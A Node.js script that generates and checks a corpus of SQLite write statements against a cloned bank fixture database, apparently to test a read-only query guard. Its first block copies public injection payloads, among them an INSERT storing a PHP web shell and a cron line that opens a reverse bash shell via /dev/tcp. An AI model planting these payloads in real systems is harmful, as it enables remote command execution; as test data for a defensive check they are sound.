'use strict';

/**
 * v4d_build_corpus.js - Generates the expanded executable-write corpus (v4d).
 * Every single item is strictly verified:
 * db.prepare(sql) SUCCEEDS on a DB clone AND stmt.readonly === false.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const Database = require('../../server/node_modules/better-sqlite3');
const { MASTER_SEED } = require('../lib/config');

const outputDir = path.resolve(__dirname, '../data/v4d');
if (!fs.existsSync(outputDir)) {
  fs.mkdirSync(outputDir, { recursive: true });
}

// Temporary DB clone for verification
const fixtureDb = path.resolve(__dirname, '../../database/bank/B1_community.db');
const tempDbPath = path.join(os.tmpdir(), `v4d_verify_${Date.now()}.db`);
fs.copyFileSync(fixtureDb, tempDbPath);
const db = new Database(tempDbPath);

const items = [];
let seq = 1;

function tryAdd(candidate) {
  try {
    const stmt = db.prepare(candidate.sql);
    if (stmt.readonly === false) {
      candidate.id = `v4d_write_${String(seq++).padStart(4, '0')}`;
      candidate.readonly = false;
      candidate.verified_prepare = true;
      items.push(candidate);
      return true;
    }
  } catch (err) {
    // prepare failed - ignore
  }
  return false;
}

// 1. PayloadsAllTheThings SQLite Payloads (Independent Public Provenance)
const pattPayloads = [
  { line: 91, sql: 'CREATE TABLE shell_pwn (dataz text)', cat: 'create_table' },
  { line: 91, sql: 'CREATE TABLE IF NOT EXISTS shell_pwn (dataz text)', cat: 'create_table' },
  { line: 92, sql: "INSERT INTO shell_pwn (dataz) VALUES ('<?php system($_GET[\"cmd\"]); ?>')", cat: 'insert' },
  { line: 108, sql: 'CREATE TABLE cron_tab (dataz text)', cat: 'create_table' },
  { line: 109, sql: "INSERT INTO cron_tab (dataz) VALUES ('* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1')", cat: 'insert' },
];

for (const p of pattPayloads) {
  tryAdd({
    category: p.cat,
    provenance: `public:SQLite-Injection.md:${p.line}`,
    sql: p.sql,
    description: `PayloadsAllTheThings SQLite-Injection.md line ${p.line} executable payload`,
    fixture_db: 'bank/B1_community.db',
  });
}

// 2. Core DML: INSERT, UPDATE, DELETE, REPLACE, UPSERT across tables & styles
const tables = [
  { name: 'brs', cols: ['br_id', 'br_nm', 'city'], pk: 'br_id', sampleVal: 9000 },
  { name: 'accts', cols: ['acct_id', 'holder_nm', 'bal', 'br_id'], pk: 'acct_id', sampleVal: 9000 },
  { name: 'txns', cols: ['txn_id', 'acct_id', 'amt', 'txn_type'], pk: 'txn_id', sampleVal: 9000 },
  { name: 'lns', cols: ['ln_id', 'acct_id', 'princ', 'rate'], pk: 'ln_id', sampleVal: 9000 },
];

// INSERT variants
for (const t of tables) {
  for (let i = 1; i <= 8; i++) {
    const id = t.sampleVal + i;
    tryAdd({
      category: 'insert',
      provenance: 'agent-authored',
      sql: `INSERT INTO ${t.name} (${t.cols[0]}) VALUES (${id})`,
      description: `Basic INSERT on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'insert',
      provenance: 'agent-authored',
      sql: `insert into "${t.name}" ("${t.cols[0]}") values (${id + 100})`,
      description: `Lowercase quoted INSERT on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'insert',
      provenance: 'agent-authored',
      sql: `InSeRt  INTO   ${t.name}   (${t.cols[0]})   VALUES   (${id + 200})`,
      description: `Case-mixed spaced INSERT on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'insert',
      provenance: 'agent-authored',
      sql: `INSERT OR IGNORE INTO ${t.name} (${t.cols[0]}) VALUES (${id + 300})`,
      description: `INSERT OR IGNORE on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
  }
}

// REPLACE variants
for (const t of tables) {
  for (let i = 1; i <= 5; i++) {
    const id = t.sampleVal + i;
    tryAdd({
      category: 'replace',
      provenance: 'agent-authored',
      sql: `REPLACE INTO ${t.name} (${t.cols[0]}) VALUES (${id})`,
      description: `REPLACE INTO on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'replace',
      provenance: 'agent-authored',
      sql: `replace into "${t.name}" ("${t.cols[0]}") values (${id + 10})`,
      description: `Lowercase quoted REPLACE on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
  }
}

// UPSERT (INSERT ... ON CONFLICT DO UPDATE)
for (const t of tables) {
  for (let i = 1; i <= 5; i++) {
    const id = t.sampleVal + i;
    tryAdd({
      category: 'upsert',
      provenance: 'agent-authored',
      sql: `INSERT INTO ${t.name} (${t.cols[0]}) VALUES (${id}) ON CONFLICT(${t.pk}) DO UPDATE SET ${t.cols[0]} = ${id}`,
      description: `UPSERT on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'upsert',
      provenance: 'agent-authored',
      sql: `insert into "${t.name}" ("${t.cols[0]}") values (${id + 20}) on conflict("${t.pk}") do nothing`,
      description: `UPSERT DO NOTHING on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
  }
}

// UPDATE variants
for (const t of tables) {
  for (let i = 1; i <= 8; i++) {
    tryAdd({
      category: 'update',
      provenance: 'agent-authored',
      sql: `UPDATE ${t.name} SET ${t.cols[0]} = ${t.cols[0]} WHERE ${t.pk} = ${i}`,
      description: `Standard UPDATE on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'update',
      provenance: 'agent-authored',
      sql: `update "${t.name}" set "${t.cols[0]}" = "${t.cols[0]}" where "${t.pk}" = ${i}`,
      description: `Quoted lowercase UPDATE on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'update',
      provenance: 'agent-authored',
      sql: `UpDaTe  ${t.name}  SeT  ${t.cols[0]} = ${t.cols[0]}  WhErE  ${t.pk} = ${i}`,
      description: `Case-mixed UPDATE on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'update',
      provenance: 'agent-authored',
      sql: `UPDATE OR IGNORE ${t.name} SET ${t.cols[0]} = ${t.cols[0]} WHERE ${t.pk} = ${i}`,
      description: `UPDATE OR IGNORE on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
  }
}

// DELETE variants
for (const t of tables) {
  for (let i = 1; i <= 8; i++) {
    tryAdd({
      category: 'delete',
      provenance: 'agent-authored',
      sql: `DELETE FROM ${t.name} WHERE ${t.pk} = -${i}`,
      description: `Basic DELETE on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'delete',
      provenance: 'agent-authored',
      sql: `delete from "${t.name}" where "${t.pk}" = -${i}`,
      description: `Quoted lowercase DELETE on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
    tryAdd({
      category: 'delete',
      provenance: 'agent-authored',
      sql: `DeLeTe   FrOm   ${t.name}   WhErE   ${t.pk} = -${i}`,
      description: `Mixed-case spaced DELETE on ${t.name}`,
      fixture_db: 'bank/B1_community.db',
    });
  }
}

// 3. DDL: CREATE TABLE, CREATE INDEX, CREATE VIEW, CREATE TRIGGER
for (let i = 1; i <= 10; i++) {
  tryAdd({
    category: 'create_table',
    provenance: 'agent-authored',
    sql: `CREATE TABLE IF NOT EXISTS test_tbl_${i} (id INTEGER PRIMARY KEY, note TEXT)`,
    description: `CREATE TABLE test_tbl_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'create_table',
    provenance: 'agent-authored',
    sql: `create table if not exists "test_tbl_q_${i}" ("id" integer primary key, "note" text)`,
    description: `Quoted lowercase CREATE TABLE test_tbl_q_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'create_table',
    provenance: 'agent-authored',
    sql: `CREATE TEMP TABLE temp_tbl_${i} AS SELECT 1 AS x`,
    description: `CREATE TEMP TABLE temp_tbl_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
}

// CREATE INDEX
for (let i = 1; i <= 8; i++) {
  tryAdd({
    category: 'create_index',
    provenance: 'agent-authored',
    sql: `CREATE INDEX IF NOT EXISTS idx_brs_c_${i} ON brs (city)`,
    description: `CREATE INDEX on brs`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'create_index',
    provenance: 'agent-authored',
    sql: `create index if not exists "idx_accts_b_${i}" on "accts" ("bal")`,
    description: `Quoted lowercase CREATE INDEX on accts`,
    fixture_db: 'bank/B1_community.db',
  });
}

// CREATE VIEW
for (let i = 1; i <= 8; i++) {
  tryAdd({
    category: 'create_view',
    provenance: 'agent-authored',
    sql: `CREATE VIEW IF NOT EXISTS v_brs_${i} AS SELECT br_id, br_nm FROM brs`,
    description: `CREATE VIEW v_brs_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'create_view',
    provenance: 'agent-authored',
    sql: `create view if not exists "v_accts_${i}" as select "acct_id" from "accts"`,
    description: `Quoted lowercase CREATE VIEW v_accts_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
}

// CREATE TRIGGER
for (let i = 1; i <= 6; i++) {
  tryAdd({
    category: 'create_trigger',
    provenance: 'agent-authored',
    sql: `CREATE TRIGGER IF NOT EXISTS tr_brs_${i} AFTER INSERT ON brs BEGIN UPDATE brs SET city = 'test' WHERE br_id = -1; END`,
    description: `CREATE TRIGGER tr_brs_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'create_trigger',
    provenance: 'agent-authored',
    sql: `create trigger if not exists "tr_accts_${i}" after delete on "accts" begin update "accts" set "bal" = 0 where "acct_id" = -1; end`,
    description: `Quoted lowercase CREATE TRIGGER tr_accts_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
}

// DROP TABLE, INDEX, VIEW, TRIGGER
for (let i = 1; i <= 6; i++) {
  tryAdd({
    category: 'drop',
    provenance: 'agent-authored',
    sql: `DROP TABLE IF EXISTS test_tbl_${i}`,
    description: `DROP TABLE test_tbl_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'drop',
    provenance: 'agent-authored',
    sql: `drop table if exists "test_tbl_q_${i}"`,
    description: `Quoted lowercase DROP TABLE test_tbl_q_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'drop',
    provenance: 'agent-authored',
    sql: `DROP INDEX IF EXISTS idx_brs_c_${i}`,
    description: `DROP INDEX idx_brs_c_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'drop',
    provenance: 'agent-authored',
    sql: `DROP VIEW IF EXISTS v_brs_${i}`,
    description: `DROP VIEW v_brs_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'drop',
    provenance: 'agent-authored',
    sql: `DROP TRIGGER IF EXISTS tr_brs_${i}`,
    description: `DROP TRIGGER tr_brs_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
}

// ALTER TABLE
for (let i = 1; i <= 6; i++) {
  tryAdd({
    category: 'alter',
    provenance: 'agent-authored',
    sql: `ALTER TABLE brs ADD COLUMN col_test_${i} TEXT`,
    description: `ALTER TABLE ADD COLUMN col_test_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'alter',
    provenance: 'agent-authored',
    sql: `alter table "accts" add column "col_q_${i}" integer`,
    description: `Quoted lowercase ALTER TABLE ADD COLUMN col_q_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'alter',
    provenance: 'agent-authored',
    sql: `ALTER TABLE brs DROP COLUMN col_test_${i}`,
    description: `ALTER TABLE DROP COLUMN col_test_${i}`,
    fixture_db: 'bank/B1_community.db',
  });
}

// VACUUM INTO
for (let i = 1; i <= 10; i++) {
  const vacPath = path.join(os.tmpdir(), `vac_${i}.db`).replace(/\\/g, '/');
  tryAdd({
    category: 'vacuum_into',
    provenance: 'agent-authored',
    sql: `VACUUM INTO '${vacPath}'`,
    description: `VACUUM INTO file export ${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'vacuum_into',
    provenance: 'agent-authored',
    sql: `vacuum into '${vacPath}'`,
    description: `Lowercase vacuum into file export ${i}`,
    fixture_db: 'bank/B1_community.db',
  });
}

// WITH-wrapped writes
for (let i = 1; i <= 10; i++) {
  tryAdd({
    category: 'with_write',
    provenance: 'agent-authored',
    sql: `WITH vals AS (SELECT ${8000 + i} AS id, 'City_${i}' AS c) INSERT INTO brs (br_id, city) SELECT id, c FROM vals`,
    description: `WITH CTE INSERT into brs`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'with_write',
    provenance: 'agent-authored',
    sql: `WITH target AS (SELECT ${i} AS id) UPDATE brs SET city = 'Updated' WHERE br_id IN (SELECT id FROM target)`,
    description: `WITH CTE UPDATE on brs`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'with_write',
    provenance: 'agent-authored',
    sql: `WITH target AS (SELECT -${i} AS id) DELETE FROM brs WHERE br_id IN (SELECT id FROM target)`,
    description: `WITH CTE DELETE on brs`,
    fixture_db: 'bank/B1_community.db',
  });
}

// PRAGMA writes
for (let i = 1; i <= 15; i++) {
  tryAdd({
    category: 'pragma_write',
    provenance: 'agent-authored',
    sql: `PRAGMA user_version = ${100 + i}`,
    description: `PRAGMA user_version write ${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'pragma_write',
    provenance: 'agent-authored',
    sql: `pragma schema_version = ${200 + i}`,
    description: `PRAGMA schema_version write ${i}`,
    fixture_db: 'bank/B1_community.db',
  });
  tryAdd({
    category: 'pragma_write',
    provenance: 'agent-authored',
    sql: `PRAGMA journal_mode = WAL`,
    description: `PRAGMA journal_mode write ${i}`,
    fixture_db: 'bank/B1_community.db',
  });
}

db.close();
try { fs.unlinkSync(tempDbPath); } catch (_) {}

console.log(`Generated and strictly verified ${items.length} executable-write statements!`);

// Write out JSONL file
const targetFile = path.join(outputDir, 'executable_writes.jsonl');
fs.writeFileSync(targetFile, items.map(JSON.stringify).join('\n') + '\n', 'utf8');

const crypto = require('crypto');
const sha256 = crypto.createHash('sha256').update(fs.readFileSync(targetFile)).digest('hex');
console.log(`Saved to ${targetFile}`);
console.log(`SHA-256: ${sha256}`);
